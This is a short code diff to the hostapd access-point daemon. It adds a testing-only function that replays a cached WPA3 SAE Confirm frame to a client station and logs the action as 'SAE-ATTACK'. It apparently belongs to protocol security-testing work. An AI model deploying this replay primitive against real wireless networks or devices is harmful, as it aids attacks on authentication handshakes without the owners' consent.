diff --git a/src/ap/ieee802_11.c b/src/ap/ieee802_11.c
index a54cde877..3d0ad4242 100644
--- a/src/ap/ieee802_11.c
+++ b/src/ap/ieee802_11.c
@@ -770,6 +770,32 @@ static int auth_sae_send_confirm(struct hostapd_data *hapd,
 	return reply_res;
 }
 
+
+#ifdef CONFIG_TESTING_OPTIONS
+/* GAP-#14 confirm-replay: TX a previously cached SAE Confirm body verbatim as
+ * an Authentication frame (SAE, auth_transaction=2). Uses the exact primitive
+ * auth_sae_send_confirm() uses (send_auth_reply) but does NOT rebuild via
+ * sae_write_confirm() -- safe post-ESTAB when the commit bignums are gone. */
+int auth_sae_send_confirm_replay(struct hostapd_data *hapd,
+				 struct sta_info *sta)
+{
+	if (!sta->sae || !sta->sae->cached_confirm) {
+		wpa_printf(MSG_INFO,
+			   "SAE-ATTACK: no cached Confirm to replay for " MACSTR,
+			   MAC2STR(sta->addr));
+		return -1;
+	}
+
+	wpa_printf(MSG_INFO,
+		   "SAE-ATTACK: replaying cached Confirm (%zu bytes) to " MACSTR,
+		   sta->sae->cached_confirm_len, MAC2STR(sta->addr));
+
+	return send_auth_reply(hapd, sta, sta->addr, WLAN_AUTH_SAE, 2,
+			       WLAN_STATUS_SUCCESS, sta->sae->cached_confirm,
+			       sta->sae->cached_confirm_len, "sae-replay");
+}
+#endif /* CONFIG_TESTING_OPTIONS */
+
 #endif /* CONFIG_SAE */
 
 
